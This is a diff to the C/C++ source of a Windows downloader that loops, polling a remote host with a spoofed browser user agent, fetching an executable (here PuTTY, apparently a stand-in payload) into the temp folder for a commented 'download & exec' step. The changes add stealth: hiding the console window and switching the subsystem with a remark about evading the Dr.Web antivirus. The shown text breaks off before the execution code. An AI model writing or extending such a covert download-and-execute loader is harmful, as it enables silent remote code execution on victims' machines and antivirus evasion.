@@ -5,33 +5,44 @@
 #include <Urlmon.h>
 #include <Shlwapi.h>
 
+
+#pragma comment(linker, "/SUBSYSTEM:WINDOWS") // bye-bye dr.web :p
+
 #pragma comment(lib, "winhttp")
 #pragma comment(lib, "shell32")
 #pragma comment(lib, "urlmon")
 #pragma comment(lib, "Shlwapi")
+#pragma comment(lib, "user32")
 
-
-
-typedef BOOL (WINAPI *CREATEPROC)(
-  __in_opt     LPCTSTR lpApplicationName,
-  __inout_opt  LPTSTR lpCommandLine,
-  __in_opt     LPSECURITY_ATTRIBUTES lpProcessAttributes,
-  __in_opt     LPSECURITY_ATTRIBUTES lpThreadAttributes,
-  __in         BOOL bInheritHandles,
-  __in         DWORD dwCreationFlags,
-  __in_opt     LPVOID lpEnvironment,
-  __in_opt     LPCTSTR lpCurrentDirectory,
-  __in         LPSTARTUPINFO lpStartupInfo,
-  __out        LPPROCESS_INFORMATION lpProcessInformation
-);
 
 int poll();
 
+typedef BOOL (WINAPI *CREATEPROC)(
+	__in_opt     LPCTSTR lpApplicationName,
+	__inout_opt  LPTSTR lpCommandLine,
+	__in_opt     LPSECURITY_ATTRIBUTES lpProcessAttributes,
+	__in_opt     LPSECURITY_ATTRIBUTES lpThreadAttributes,
+	__in         BOOL bInheritHandles,
+	__in         DWORD dwCreationFlags,
+	__in_opt     LPVOID lpEnvironment,
+	__in_opt     LPCTSTR lpCurrentDirectory,
+	__in         LPSTARTUPINFO lpStartupInfo,
+	__out        LPPROCESS_INFORMATION lpProcessInformation
+	);
+
 wchar_t sPollUrl[] = L"the.earth.li";
+wchar_t sPollRsrc[] = L"/~sgtatham/putty/latest/x86/putty.exe";
 wchar_t sUserAgent[] = L"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11";
 
-int main()
+
+int APIENTRY WinMain(HINSTANCE hInstance,
+                     HINSTANCE hPrevInstance,
+                     LPTSTR    lpCmdLine,
+                     int       nCmdShow)
 {
+	HWND hWnd = GetConsoleWindow();
+	ShowWindow(hWnd, SW_HIDE);
+
 	while(1)
 	{
 		poll();
@@ -57,10 +68,9 @@ int poll()
 	if (!hConnect)
 		return 0;
 
-	HINTERNET hRequest = WinHttpOpenRequest(
-		hConnect,
+	HINTERNET hRequest = WinHttpOpenRequest(hConnect,
 		L"GET",
-		L"/~sgtatham/putty/latest/x86/putty.exe",
+		sPollRsrc,
 		NULL,
 		WINHTTP_NO_REFERER,
 		WINHTTP_DEFAULT_ACCEPT_TYPES,
@@ -77,11 +87,11 @@ int poll()
 		NULL);
 	if (!ret)
 		return 0;
-	
+
 	ret = WinHttpReceiveResponse(hRequest, NULL);
 	if (!ret)
 		return 0;
-	
+
 	DWORD BuffLen = 20;
 	LPVOID HttpStatus = new WCHAR[20];
 	ret = WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE, WINHTTP_HEADER_NAME_BY_INDEX, HttpStatus, &BuffLen, WINHTTP_NO_HEADER_INDEX);
@@ -91,8 +101,7 @@ int poll()
 	if (memcmp(HttpStatus, "\x32\x00\x30\x00\x30", 5))
 		return 0;
 
-
-
+	/* download & exec */
 	LPSTR TmpPath = (LPSTR)malloc(MAX_PATH);
 	memset(TmpPath, 0x0, MAX_PATH);
 	if (!GetTempPath(MAX_PATH, TmpPath))
